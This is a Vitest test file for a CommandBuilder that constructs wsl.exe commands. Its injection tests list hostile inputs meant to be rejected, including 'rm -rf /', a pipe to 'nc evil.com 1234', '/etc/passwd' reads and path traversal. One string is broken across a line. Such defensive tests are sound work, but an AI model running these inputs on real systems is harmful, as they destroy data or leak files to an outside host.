/**
 * CommandBuilder Real Tests
 * Tests actual command construction and execution
 *
 * @author Marcus Johnson, QA Manager
 */

import { describe, it, expect } from 'vitest';
import { CommandBuilder } from '../../../src/utils/commandBuilder';
import { assertCommandSucceeds, assertThrowsAsync } from '../../helpers/assertions';
import { spawn } from 'child_process';

describe('CommandBuilder - Real Command Construction', () => {
    describe('buildListCommand()', () => {
        it('should build valid list command', () => {
            const command = CommandBuilder.buildListCommand();

            expect(command.command).toBe('wsl.exe');
            expect(command.args).toContain('--list');
            expect(command.args).toContain('--verbose');
        });

        it('should execute list command successfully', async () => {
            const { command, args } = CommandBuilder.buildListCommand();

            // Execute real command
            const output = await assertCommandSucceeds(command, args);

            // Should return WSL distribution list or error message
            expect(output).toBeDefined();
        });
    });

    describe('buildCreateCommand()', () => {
        it('should build valid create command', () => {
            const command = CommandBuilder.buildCreateCommand('test-distro', 'Ubuntu');

            expect(command.command).toBe('wsl.exe');
            expect(command.args).toContain('--clone');
            expect(command.args).toContain('Ubuntu');
            expect(command.args).toContain('test-distro');
        });

        it('should escape special characters in names', () => {
            const command = CommandBuilder.buildCreateCommand('test distro', 'Ubuntu 20.04');

            // Arguments should be properly formatted
            expect(command.args).toContain('test distro');
            expect(command.args).toContain('Ubuntu 20.04');
        });

        it('should reject dangerous input', () => {
            expect(() =>
                CommandBuilder.buildCreateCommand('test;rm -rf /', 'Ubuntu')
            ).toThrow();

            expect(() =>
                CommandBuilder.buildCreateCommand('test', 'Ubuntu;evil')
            ).toThrow();
        });
    });

    describe('buildImportCommand()', () => {
        it('should build valid import command', () => {
            const command = CommandBuilder.buildImportCommand(
                'test-distro',
                '/tmp/distro.tar',
                '/mnt/wsl/test'
            );

            expect(command.command).toBe('wsl.exe');
            expect(command.args).toContain('--import');
            expect(command.args).toContain('test-distro');
            expect(command.args).toContain('/tmp/distro.tar');
            expect(command.args).toContain('/mnt/wsl/test');
        });

        it('should handle Windows paths correctly', () => {
            const command = CommandBuilder.buildImportCommand(
                'test-distro',
                'C:\\exports\\distro.tar',
                'C:\\WSL\\test'
            );

            // Paths should be preserved
            expect(command.args).toContain('C:\\exports\\distro.tar');
            expect(command.args).toContain('C:\\WSL\\test');
        });

        it('should reject path traversal attempts', () => {
            expect(() =>
                CommandBuilder.buildImportCommand(
                    'test',
                    '../../../etc/passwd',
                    '/tmp/test'
                )
            ).toThrow();

            expect(() =>
                CommandBuilder.buildImportCommand(
                    'test',
                    '/tmp/test.tar',
                    '../../sensitive'
                )
            ).toThrow();
        });
    });

    describe('buildExportCommand()', () => {
        it('should build valid export command', () => {
            const command = CommandBuilder.buildExportCommand('Ubuntu', '/tmp/export.tar');

            expect(command.command).toBe('wsl.exe');
            expect(command.args).toContain('--export');
            expect(command.args).toContain('Ubuntu');
            expect(command.args).toContain('/tmp/export.tar');
        });

        it('should handle spaces in paths', () => {
            const command = CommandBuilder.buildExportCommand(
                'Ubuntu',
                'C:\\My Documents\\export.tar'
            );

            expect(command.args).toContain('C:\\My Documents\\export.tar');
        });
    });

    describe('buildUnregisterCommand()', () => {
        it('should build valid unregister command', () => {
            const command = CommandBuilder.buildUnregisterCommand('test-distro');

            expect(command.command).toBe('wsl.exe');
            expect(command.args).toContain('--unregister');
            expect(command.args).toContain('test-distro');
        });

        it('should reject dangerous distribution names', () => {
            expect(() =>
                CommandBuilder.buildUnregisterCommand('test;evil')
            ).toThrow();
        });
    });

    describe('buildTerminateCommand()', () => {
        it('should build valid terminate command', () => {
            const command = CommandBuilder.buildTerminateCommand('Ubuntu');

            expect(command.command).toBe('wsl.exe');
            expect(command.args).toContain('--terminate');
            expect(command.args).toContain('Ubuntu');
        });
    });

    describe('buildSetDefaultCommand()', () => {
        it('should build valid set default command', () => {
            const command = CommandBuilder.buildSetDefaultCommand('Ubuntu');

            expect(command.command).toBe('wsl.exe');
            expect(command.args).toContain('--set-default');
            expect(command.args).toContain('Ubuntu');
        });
    });

    describe('buildRunCommand()', () => {
        it('should build valid run command', () => {
            const command = CommandBuilder.buildRunCommand('Ubuntu', 'echo "Hello"');

            expect(command.command).toBe('wsl.exe');
            expect(command.args).toContain('-d');
            expect(command.args).toContain('Ubuntu');
            expect(command.args).toContain('--');

            // Command should be split into separate arguments
            const dashIndex = command.args.indexOf('--');
            expect(command.args[dashIndex + 1]).toBe('echo');
            expect(command.args[dashIndex + 2]).toBe('Hello');
        });

        it('should handle complex commands', () => {
            const command = CommandBuilder.buildRunCommand(
                'Ubuntu',
                'ls -la /home/user'
            );

            const dashIndex = command.args.indexOf('--');
            expect(command.args[dashIndex + 1]).toBe('ls');
            expect(command.args[dashIndex + 2]).toBe('-la');
            expect(command.args[dashIndex + 3]).toBe('/home/user');
        });

        it('should reject command injection attempts', () => {
            const dangerousCommands = [
                '; rm -rf /',
                '&& malicious',
                '| nc evil.com 1234',
                '`cat /etc/passwd`',
                '$(whoami)'
            ];

            for (const cmd of dangerousCommands) {
                expect(() =>
                    CommandBuilder.buildRunCommand('Ubuntu', cmd)
                ).toThrow();
            }
        });
    });

    describe('executeWSL()', () => {
        it('should execute valid commands', async () => {
            const command = CommandBuilder.buildListCommand();

            const result = await CommandBuilder.executeWSL(command);

            expect(result).toHaveProperty('stdout');
            expect(result).toHaveProperty('stderr');
            expect(result).toHaveProperty('code');
        });

        it('should handle command timeout', async () => {
            // Create a command that would hang
            const command = {
                command: 'wsl.exe',
                args: ['-d', 'Ubuntu', '--', 'sleep', '60']
            };

            // Should timeout (set very short timeout for test)
            await assertThrowsAsync(
                () => CommandBuilder.executeWSL(command, { timeout: 100 }),
                /timeout/i
            );
        });

        it('should capture error output', async () => {
            // Try to access non-existent distribution
            const command = {
                command: 'wsl.exe',
                args: ['--terminate', 'NonExistentDistro123456']
            };

            const result = await CommandBuilder.executeWSL(command);

            // Should have error in stderr or non-zero code
            expect(result.code !== 0 || result.stderr.length > 0).toBe(true);
        });
    });

    describe('escapeArgument()', () => {
        it('should escape shell special characters', () => {
            const testCases = [
                { input: 'simple', expected: 'simple' },
                { input: 'with space', expected: 'with space' },
                { input: 'with"quote', expected: 'with"quote' },
                { input: "with'apostrophe", expected: "with'apostrophe" },
                { input: 'with$variable', expected: 'with$variable' },
                { input: 'with`backtick', expected: 'with`backtick' }
            ];

            for (const { input, expected } of testCases) {
                const escaped = CommandBuilder.escapeArgument(input);
                expect(escaped).toBe(expected);
            }
        });

        it('should reject null bytes', () => {
            expect(() =>
                CommandBuilder.escapeArgument('test\0null')
            ).toThrow();
        });

        it('should reject newlines', () => {
            expect(() =>
                CommandBuilder.escapeArgument('test\nnewline')
            ).toThrow();

            expect(() =>
                CommandBuilder.escapeArgument('test\r\ncarriage')
            ).toThrow();
        });
    });

    describe('Real Command Execution', () => {
        it('should list distributions without errors', async () => {
            const command = CommandBuilder.buildListCommand();
            const result = await CommandBuilder.executeWSL(command);

            // Should complete successfully or with known WSL not installed error
            if (result.code === 0) {
                expect(result.stdout).toBeDefined();
            } else {
                // WSL might not be installed
                expect(result.stderr).toMatch(/wsl|not found|not recognized/i);
            }
        });

        it('should handle Unicode in commands', () => {
            const unicodeNames = [
                'café-distro',
                'zürich-wsl',
                '北京-linux'
            ];

            for (const name of unicodeNames) {
                // Should not throw
                const command = CommandBuilder.buildCreateCommand(name, 'Ubuntu');
                expect(command.args).toContain(name);
            }
        });

        it('should build platform-appropriate paths', () => {
            const isWindows = process.platform === 'win32';
            const testPath = isWindows ? 'C:\\test\\file.tar' : '/tmp/test/file.tar';

            const command = CommandBuilder.buildImportCommand('test', testPath, '/tmp/install');

            expect(command.args).toContain(testPath);
        });

        it('should validate command structure', () => {
            // All commands should have wsl.exe as the command
            const commands = [
                CommandBuilder.buildListCommand(),
                CommandBuilder.buildCreateCommand('test', 'Ubuntu'),
                CommandBuilder.buildImportCommand('test', '/tmp/test.tar', '/tmp/install'),
                CommandBuilder.buildExportCommand('test', '/tmp/export.tar'),
                CommandBuilder.buildUnregisterCommand('test'),
                CommandBuilder.buildTerminateCommand('test'),
                CommandBuilder.buildSetDefaultCommand('test'),
                CommandBuilder.buildRunCommand('test', 'echo test')
            ];

            for (const cmd of commands) {
                expect(cmd.command).toBe('wsl.exe');
                expect(Array.isArray(cmd.args)).toBe(true);
                expect(cmd.args.length).toBeGreaterThan(0);
            }
        });
    });

    describe('Security Integration', () => {
        it('should prevent all forms of injection', () => {
            const injectionVectors = [
                '; malicious',
                '&& evil',
                '|| bad',
                '| pipe',
                '> redirect',
                '< input',
                '`backtick`',
                '$(subshell)',
                '\nne

wline',
                '\r\ncarriage',
                '\0null',
                '../traversal',
                '..\\windows'
            ];

            for (const vector of injectionVectors) {
                // Test in different contexts
                expect(() =>
                    CommandBuilder.buildCreateCommand(vector, 'Ubuntu')
                ).toThrow();

                expect(() =>
                    CommandBuilder.buildRunCommand('Ubuntu', vector)
                ).toThrow();

                expect(() =>
                    CommandBuilder.buildImportCommand('test', vector, '/tmp')
                ).toThrow();
            }
        });

        it('should handle edge cases safely', () => {
            // Empty strings
            expect(() => CommandBuilder.buildCreateCommand('', 'Ubuntu')).toThrow();
            expect(() => CommandBuilder.buildCreateCommand('test', '')).toThrow();

            // Very long strings
            const longString = 'a'.repeat(10000);
            expect(() => CommandBuilder.buildCreateCommand(longString, 'Ubuntu')).toThrow();

            // Special filesystem names
            const reservedNames = ['CON', 'PRN', 'AUX', 'NUL', 'COM1', 'LPT1'];
            for (const name of reservedNames) {
                // Should handle these carefully
                const command = CommandBuilder.buildCreateCommand(`test-${name}`, 'Ubuntu');
                expect(command.args).toContain(`test-${name}`);
            }
        });
    });
});